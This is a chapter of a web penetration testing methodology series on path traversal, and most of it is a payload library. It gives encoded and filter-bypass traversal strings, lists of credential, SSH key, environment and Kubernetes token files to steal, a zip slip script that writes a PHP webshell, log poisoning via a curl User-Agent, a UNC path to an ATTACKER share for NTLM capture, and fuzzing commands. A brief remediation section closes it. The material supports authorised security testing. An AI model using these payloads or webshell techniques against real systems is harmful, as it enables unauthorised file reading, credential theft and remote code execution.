---
title: "Path Traversal / Directory Traversal"
date: 2026-02-24
draft: false
---

# Path Traversal / Directory Traversal

> **Severity**: High–Critical
> **CWE**: CWE-22
> **OWASP**: A01:2021 – Broken Access Control

---

## What Is Path Traversal?

Path Traversal (also known as Directory Traversal or `../` attack) occurs when user-controlled input is used to construct a **filesystem path** without proper sanitization, allowing the attacker to read (or write) files outside the intended directory.

The canonical payload is `../` — traversing one directory level up. Chained enough times, it reaches the root of the filesystem and can access any readable file: credentials, source code, private keys, configurations, OS files.

In write-capable scenarios, path traversal becomes a **full RCE primitive**: write a webshell to the web root, write a cron job, write SSH authorized_keys.

---

## Attack Surface Map

### Where Path Traversal Typically Occurs

```
# Direct file parameters:
/download?file=report.pdf
/load?template=invoice.html
/image?path=user/avatar.jpg
/read?name=README.txt
/view?page=about
/include?module=header
/export?format=csv&file=output

# Indirect parameters:
- File upload → stored path → later fetched
- Archive extraction (zip slip)
- Language/locale selection: ?lang=en → loads /i18n/en.json
- Theme/skin selection: ?theme=dark → loads /themes/dark/style.css
- Log viewer: ?log=access → reads /logs/access.log
- Plugin/module loader: ?plugin=markdown → loads /plugins/markdown.php
- Document viewer: ?doc=report → reads /docs/report.pdf
- Email template: ?template=welcome → loads /templates/welcome.html

# HTTP headers that may influence file paths:
- Accept-Language: ../../etc/passwd
- Referer (if used for template selection)
- X-Original-URL (path override in nginx/Apache)
```

---

## Discovery Checklist

### Phase 1 — Passive Identification

- [ ] Map all parameters that reference files, templates, pages, modules, or resources
- [ ] Identify file download / export / preview endpoints
- [ ] Check language, theme, locale parameters
- [ ] Look for log viewers, report generators, or document readers
- [ ] Identify ZIP/TAR file upload that is extracted server-side
- [ ] Check if filenames in responses correspond to actual server filenames
- [ ] Look for base paths in JS source (`/var/www/html/`, `/app/`, `C:\inetpub\`)

### Phase 2 — Active Detection

- [ ] Inject `../` sequences into file/path parameters
- [ ] Try known safe files: `/etc/passwd` (Linux), `C:\Windows\win.ini` (Windows)
- [ ] Test with increasing `../` chains: `../etc/passwd`, `../../etc/passwd`, `../../../etc/passwd`
- [ ] Test with URL encoding: `..%2fetc%2fpasswd`
- [ ] Test with double URL encoding: `..%252fetc%252fpasswd`
- [ ] Test with null byte: `../../../etc/passwd%00.jpg`
- [ ] Test with absolute path: `/etc/passwd`
- [ ] Test Windows-style: `..\..\..\Windows\win.ini`
- [ ] Check response differences: file found vs not found vs error
- [ ] Test in archive uploads (zip slip): file with `../../` path in header

### Phase 3 — Confirm & Escalate

- [ ] Confirm read of `/etc/passwd` — identifies Linux system
- [ ] Read application config files, `.env`, `database.yml`
- [ ] Read source code from known paths (detect framework → guess paths)
- [ ] Read SSH private keys: `~/.ssh/id_rsa`, `/root/.ssh/id_rsa`
- [ ] Read web server config for other virtual hosts / paths
- [ ] Read log files for credentials or sensitive data
- [ ] Test write capability (upload then traverse path)
- [ ] In ZIP upload: attempt zip slip to write to web root

---

## Payload Library

### Section 1 — Basic Traversal Sequences

```
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../
../../../../../../../../../

-- Absolute paths (skip traversal):
/etc/passwd
/etc/shadow
/etc/hosts
C:\Windows\win.ini
C:\boot.ini
```

### Section 2 — URL Encoding Variants

```
-- Single encode (/ → %2f, . → %2e):
..%2fetc%2fpasswd
..%2f..%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd

-- Double encode (%25 = %):
..%252fetc%252fpasswd
%252e%252e%252fetc%252fpasswd
..%252f..%252fetc%252fpasswd

-- Triple encode:
..%25252fetc%25252fpasswd

-- Mixed encoding:
..%2f../etc/passwd
..\..%2fetc%2fpasswd
..%5c..%5cetc%5cpasswd          -- %5c = \
```

### Section 3 — Filter Bypass Techniques

#### Null Byte Injection (older PHP / C-based code)

```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd\0
../../etc/passwd%00.pdf
```

#### Extension Bypass (when extension is appended)

```
-- If app appends ".php" to your input:
../../../etc/passwd%00        -- null byte strips extension (PHP < 5.3)
../../../etc/passwd/.         -- trailing /. may remove extension
../../../etc/passwd%20        -- trailing space
../../../etc/passwd.          -- trailing dot (Windows)

-- Double extension:
../../../etc/passwd.png../../../etc/passwd   -- parser takes first found
```

#### Stripped Traversal Bypass (when `../` is removed)

```
-- Non-recursive strip (removes ../ once):
....//            → after strip of ../ → ../
....\/            → after strip of ..\ → ..\
..//              → after normalizing → ../
.././             → ./  then resolves to parent
..%2F             → if only literal ../ is stripped
....%2F%2F        → double encode after stripping

-- Mixed case (Windows is case-insensitive):
..\
..\/
..\../

-- Unicode variations:
..%c0%af          → / in overlong UTF-8 (CVE-era, some old parsers)
..%c1%9c          → \ in overlong UTF-8
%uff0e%uff0e/     → fullwidth ..
..%e0%80%af       → another overlong /
```

#### Windows-Specific Bypasses

```
-- Backslash:
..\Windows\win.ini
..\..\Windows\win.ini
..\..\..\..\Windows\win.ini

-- Mixed slashes:
../..\..\Windows\win.ini
..\../Windows/win.ini

-- Drive letter:
C:\Windows\win.ini
C:/Windows/win.ini
\Windows\win.ini

-- UNC (potential NTLM capture):
\\ATTACKER\share\file

-- 8.3 short names:
WINDOW~1\WIN.INI      -- Windows 8.3 filename
PROGRA~1\             -- Program Files
```

#### Path Normalization Bypass

```
-- Extra slashes:
////etc/passwd
..////etc/passwd
..//..//etc/passwd

-- Dot sequences:
./../../etc/passwd
../././../../etc/passwd
../.%2e/etc/passwd
./%2e./etc/passwd

-- Semicolon (URL segmentation in some servers):
/file;/../../../etc/passwd
```

### Section 4 — Target Files — Linux

#### System & Credentials

```
/etc/passwd
/etc/shadow
/etc/group
/etc/gshadow
/etc/sudoers
/etc/sudoers.d/
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/crontab
/var/spool/cron/crontabs/root
```

#### SSH

```
/home/USER/.ssh/id_rsa
/home/USER/.ssh/id_ecdsa
/home/USER/.ssh/id_ed25519
/home/USER/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/root/.ssh/known_hosts
```

#### Web Application Configs

```
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/configuration.php    -- Joomla
/var/www/html/app/config/database.php
/app/.env
/app/config/database.yml
/app/config/secrets.yml
/app/settings.py
/opt/app/config.json
/srv/www/htdocs/.env

-- Spring Boot:
/opt/app/application.properties
/opt/app/application.yml

-- Django:
/opt/app/settings.py

-- Rails:
/opt/app/config/database.yml
/opt/app/config/secrets.yml
```

#### Process Info

```
/proc/self/environ           -- environment variables (may contain secrets)
/proc/self/cmdline           -- process command line
/proc/self/maps              -- memory maps (reveals binary paths)
/proc/self/fd/0              -- stdin
/proc/self/fd/1              -- stdout
/proc/self/fd/2              -- stderr
/proc/self/cwd               -- symlink to working directory
/proc/self/exe               -- symlink to executable
/proc/net/tcp                -- open TCP connections
/proc/net/fib_trie           -- internal IP addresses
/proc/version                -- kernel version
/proc/1/cmdline              -- init/systemd command line
```

#### Web Server Logs & Configs

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/httpd/conf/httpd.conf
```

#### Cloud / Container

```
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/docker.sock               -- Docker API socket
/.dockerenv                        -- confirms Docker container
/proc/1/cgroup                     -- reveals container runtime
```

### Section 5 — Target Files — Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\repair\sam
C:\Windows\repair\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Users\Administrator\.ssh\id_rsa
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
C:\xampp\mysql\bin\my.ini
C:\xampp\passwords.txt
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf\tomcat-users.xml
C:\Program Files\FileZilla Server\FileZilla Server.xml
%SYSTEMROOT%\system32\config\AppEvent.Evt
%SYSTEMROOT%\system32\config\SecEvent.Evt
```

### Section 6 — Zip Slip (Archive Path Traversal)

Zip Slip occurs when a server extracts a ZIP/TAR/JAR archive and does not validate the paths within the archive entries, allowing files to be written anywhere on the filesystem.

```bash
-- Create malicious ZIP with traversal path:
# Using Python:
python3 -c "
import zipfile
zf = zipfile.ZipFile('evil.zip', 'w')
zf.write('/etc/passwd', '../../../var/www/html/passwd.txt')
zf.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]);?>')
zf.close()
"

-- Using evilarc tool:
git clone https://github.com/ptoomey3/evilarc
python evilarc.py shell.php -o unix -f evil.zip -d 5 -p var/www/html/

-- TAR archive path traversal:
tar cvf evil.tar ../../../../var/www/html/shell.php

-- JAR (Java):
# Same as ZIP — JAR is a ZIP archive
jar cf evil.jar ../../../../webapp/shell.jsp

-- Verify malicious path is in archive:
unzip -l evil.zip
zipinfo evil.zip

-- Common vulnerable archive extractors:
# Python: tarfile (check for ../ in member names)
# Java: ZipInputStream (check for getEntry path)
# PHP: ZipArchive (check extractTo validation)
# Node: unzipper, decompress (check path sanitization)
```

---

### Section 7 — Log Poisoning via Path Traversal

When you can read log files AND inject into them (via User-Agent, error pages, etc.):

```bash
-- Step 1: Poison the log (send request with PHP code in User-Agent):
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

-- Step 2: Include the log file via path traversal LFI:
/download?file=../../../var/log/apache2/access.log&cmd=id

-- Common log paths:
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log      -- SSH login attempts → poison via SSH username
/var/mail/www-data     -- if app sends mail, user-input in email headers
/proc/self/fd/2        -- stderr (direct access without log file)
```

---

## Tools

```bash
# dotdotpwn — automated path traversal fuzzer:
git clone https://github.com/wireghoul/dotdotpwn
perl dotdotpwn.pl -m http -h target.com -f /etc/passwd -k "root:"

# ffuf — path traversal fuzzing:
ffuf -w ~/wordlists/traversal.txt \
     -u "https://target.com/download?file=FUZZ" \
     -mr "root:" -r

# Burp Intruder — with path traversal wordlist:
# Payload: file path variants + target files

# Path traversal wordlist generation:
for i in {1..10}; do
  echo -n '../';
done | sed 's/$/etc\/passwd/' >> traversal.txt

# curl with traversal:
curl -v "https://target.com/file?name=../../../../../../etc/passwd"
curl -v "https://target.com/file?name=..%2f..%2f..%2fetc%2fpasswd"

# Python quick test:
python3 -c "
import requests
for n in range(1, 10):
    path = '../' * n + 'etc/passwd'
    r = requests.get(f'https://target.com/file?name={path}')
    if 'root:' in r.text:
        print(f'FOUND at depth {n}: {path}')
        break
"
```

---

## Remediation Reference

- **Canonicalize paths before validation**: resolve symlinks and `../` sequences first, then check the resulting absolute path is within the allowed base directory
- **Whitelist filenames**: only allow alphanumeric characters, dots, and hyphens — never allow slashes or backslashes in user input used in paths
- **Use language-native path join functions with validation**: `os.path.realpath()` (Python), `File.getCanonicalPath()` (Java), `Path.GetFullPath()` (.NET) — then verify the resolved path starts with the expected base directory
- **Strip traversal sequences** only as a secondary defense (not primary — it's bypassable)
- **Do not expose raw filesystem paths** to users — use opaque identifiers (UUIDs) mapped to files internally
- **Validate archive contents** before extraction: check that every entry's path resolves within the intended output directory
- **Chroot / containerize** file access where possible

---

*Part of the Web Application Penetration Testing Methodology series.*
*Previous: [Chapter 16 — SSRF](16_SSRF.md) | Next: [Chapter 18 — File Inclusion (LFI/RFI)](18_FileInclusion.md)*
